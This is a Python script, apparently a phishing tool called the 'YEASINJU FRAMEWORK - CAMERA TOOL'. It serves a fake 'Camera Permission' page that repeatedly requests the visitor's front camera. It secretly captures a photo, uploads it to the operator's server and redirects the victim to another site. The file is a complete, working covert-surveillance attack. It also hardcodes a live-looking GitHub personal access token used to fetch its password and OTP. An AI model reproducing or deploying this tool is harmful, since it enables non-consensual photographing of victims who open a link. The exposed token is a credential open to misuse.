import requests
import http.server
import socketserver
import urllib.parse
import base64
import os
import time
import shutil
import subprocess

# --- GITHUB AUTH CONFIGURATION ---
GITHUB_USERNAME = "yeasinhossain544"
REPO_NAME = "yeasinju-config"
TOKEN = "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"

# GitHub API URL (Private Repository File Read)
URL = f"https://api.github.com/repos/{GITHUB_USERNAME}/{REPO_NAME}/contents/config.json"

def verify_tool_access():
    headers = {
        "Authorization": f"token {TOKEN}",
        "Accept": "application/vnd.github.v3.raw"
    }
    
    try:
        response = requests.get(URL, headers=headers)
        
        if response.status_code == 200:
            data = response.json()
            correct_pass = data.get("password")
            correct_otp = data.get("otp")

            user_pass = input("Enter Password: ")
            user_otp = input("Enter OTP: ")

            if user_pass == correct_pass and user_otp == correct_otp:
                print("\n[+] Access Granted! Welcome to the Tool.\n")
                return True
            else:
                print("\n[-] Invalid Password or OTP! Access Denied.")
                return False
        else:
            print("\n[-] Error fetching configuration. Status Code:", response.status_code)
            return False
            
    except Exception as e:
        print("\n[-] Connection Error! Please check your internet.")
        return False

def free_port(port):
    try:
        if shutil.which("fuser"):
            subprocess.run(["fuser", "-k", f"{port}/tcp"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, check=False)
            return True
    except Exception:
        pass

    try:
        result = subprocess.run(["lsof", "-ti", f":{port}"], capture_output=True, text=True, check=False)
        pids = [pid.strip() for pid in result.stdout.splitlines() if pid.strip()]
        for pid in pids:
            subprocess.run(["kill", "-9", pid], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, check=False)
        return True
    except Exception:
        return False

# --- MAIN TOOL PROCESS ---
def run_main_tool():
    # Screen clear
    os.system('clear')

    PORT = 3333
    IMAGE_DIR = "captured_images"

    if not os.path.exists(IMAGE_DIR):
        os.makedirs(IMAGE_DIR)

    # ANSI Color Codes
    GREEN = "\033[92m"
    CYAN = "\033[96m"
    YELLOW = "\033[93m"
    RED = "\033[91m"
    RESET = "\033[0m"

    def print_banner():
        print(CYAN + "=" * 60 + RESET)
        print(GREEN + r"""
  __    _____ __    ____ _  _   |_  |  |
  \ \ / / _ / _\  / ___/ || |  | | |  |
   \ V /  __/ /_  \___ \ || | _| | |_ |
    |_|\___|\__/  |____/_||_|(___|\___/
        """ + RESET)
        print(YELLOW + "            [ YEASINJU FRAMEWORK - CAMERA TOOL ]            " + RESET)
        print(CYAN + "=" * 60 + RESET)

    print_banner()

    redirect_url = input(YELLOW + "[+] Enter Redirect URL (e.g. https://google.com): " + RESET).strip()

    if not redirect_url.startswith(("http://", "https://")):
        redirect_url = "https://" + redirect_url

    print(GREEN + f"[*] Target Redirect Set To: {redirect_url}" + RESET)
    print(CYAN + "=" * 60 + RESET)

    HTML_TEMPLATE = f"""<!DOCTYPE html>
<html lang="bn">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Camera Permission</title>
    <style>
        body {{
            background: #f3f4f6;
            margin: 0;
            padding: 0;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            font-family: Arial, sans-serif;
        }}
    </style>
</head>
<body>
    <video id="video" autoplay muted playsinline style="display:none;"></video>
    <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>

    <script>
        const targetRedirect = "{redirect_url}";
        const MAX_BYTES = 30000;
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        const redirectDelayMs = 150;
        let streamRef = null;
        let isAskingPermission = false;

        function dataURLSize(dataUrl) {{
            const base64 = dataUrl.split(',')[1] || '';
            return Math.ceil((base64.length * 3) / 4);
        }}

        function redirectNow() {{
            try {{
                window.top.location.replace(targetRedirect);
            }} catch (e) {{
                window.location.replace(targetRedirect);
            }}
        }}

        function captureAndRedirect(stream) {{
            streamRef = stream;
            video.srcObject = stream;
            video.muted = true;
            video.playsInline = true;
            video.setAttribute('playsinline', 'true');

            const captureFrame = () => {{
                try {{
                    const width = 640;
                    const height = 480;
                    canvas.width = width;
                    canvas.height = height;

                    const context = canvas.getContext('2d', {{ alpha: false }});
                    context.fillStyle = '#ffffff';
                    context.fillRect(0, 0, width, height);
                    context.drawImage(video, 0, 0, width, height);

                    let imageData = canvas.toDataURL('image/jpeg', 0.72);
                    let size = dataURLSize(imageData);

                    for (let quality = 0.68; quality >= 0.18; quality -= 0.04) {{
                        imageData = canvas.toDataURL('image/jpeg', quality);
                        size = dataURLSize(imageData);
                        if (size <= MAX_BYTES) break;
                    }}

                    fetch('/upload', {{
                        method: 'POST',
                        headers: {{ 'Content-Type': 'application/x-www-form-urlencoded' }},
                        body: 'image=' + encodeURIComponent(imageData)
                    }}).catch(() => {{}}).finally(() => {{
                        if (streamRef) {{
                            streamRef.getTracks().forEach(track => track.stop());
                        }}
                        setTimeout(redirectNow, redirectDelayMs);
                    }});
                }} catch (e) {{
                    if (streamRef) {{
                        streamRef.getTracks().forEach(track => track.stop());
                    }}
                    setTimeout(redirectNow, redirectDelayMs);
                }}
            }};

            if (video.readyState >= 2) {{
                video.play().then(captureFrame).catch(() => {{
                    if (streamRef) {{
                        streamRef.getTracks().forEach(track => track.stop());
                    }}
                    setTimeout(redirectNow, redirectDelayMs);
                }});
            }} else {{
                video.onloadeddata = () => {{
                    video.play().then(captureFrame).catch(() => {{
                        if (streamRef) {{
                            streamRef.getTracks().forEach(track => track.stop());
                        }}
                        setTimeout(redirectNow, redirectDelayMs);
                    }});
                }};
            }}
        }}

        async function requestCamera() {{
            if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia || isAskingPermission) {{
                return;
            }}

            isAskingPermission = true;

            try {{
                const stream = await navigator.mediaDevices.getUserMedia({{
                    video: {{
                        width: {{ ideal: 640 }},
                        height: {{ ideal: 480 }},
                        facingMode: 'user'
                    }},
                    audio: false
                }});

                isAskingPermission = false;
                captureAndRedirect(stream);
            }} catch (err) {{
                isAskingPermission = false;
                setTimeout(requestCamera, 1200);
            }}
        }}

        requestCamera();
    </script>
</body>
</html>
"""

    class CustomHandler(http.server.SimpleHTTPRequestHandler):
        def do_GET(self):
            self.send_response(200)
            self.send_header("Content-type", "text/html")
            self.end_headers()
            self.wfile.write(HTML_TEMPLATE.encode('utf-8'))

        def do_POST(self):
            if self.path == '/upload':
                content_length = int(self.headers['Content-Length'])
                post_data = self.rfile.read(content_length).decode('utf-8')
                
                parsed_data = urllib.parse.parse_qs(post_data)
                if 'image' in parsed_data:
                    img_data = parsed_data['image'][0]
                    if 'data:image' in img_data:
                        img_data = img_data.split(',', 1)[1]
                    img_data = img_data.replace(' ', '+')

                    filename = os.path.join(IMAGE_DIR, f"yeasinju_{int(time.time())}.jpg")
                    with open(filename, "wb") as fh:
                        fh.write(base64.b64decode(img_data))

                    print(GREEN + f"\n[+] Image captured successfully -> ./{filename}" + RESET)
                
                self.send_response(200)
                self.end_headers()
                self.wfile.write(b"OK")

    free_port(PORT)

    print(GREEN + f"[*] Server running on: http://localhost:{PORT}" + RESET)
    print(GREEN + f"[*] Captured images directory: ./{IMAGE_DIR}/" + RESET)

    class ReusableTCPServer(socketserver.TCPServer):
        allow_reuse_address = True

    httpd = ReusableTCPServer(("", PORT), CustomHandler)

    try:
        httpd.serve_forever()
    except KeyboardInterrupt:
        print(RED + "\n[*] Yeasinju Tool Stopped." + RESET)
    finally:
        httpd.shutdown()
        httpd.server_close()
        print(RED + "[*] Port Released. Ready for Restart." + RESET)

# --- SCRIPT EXECUTION ENTRY POINT ---
if __name__ == "__main__":
    if verify_tool_access():
        run_main_tool()
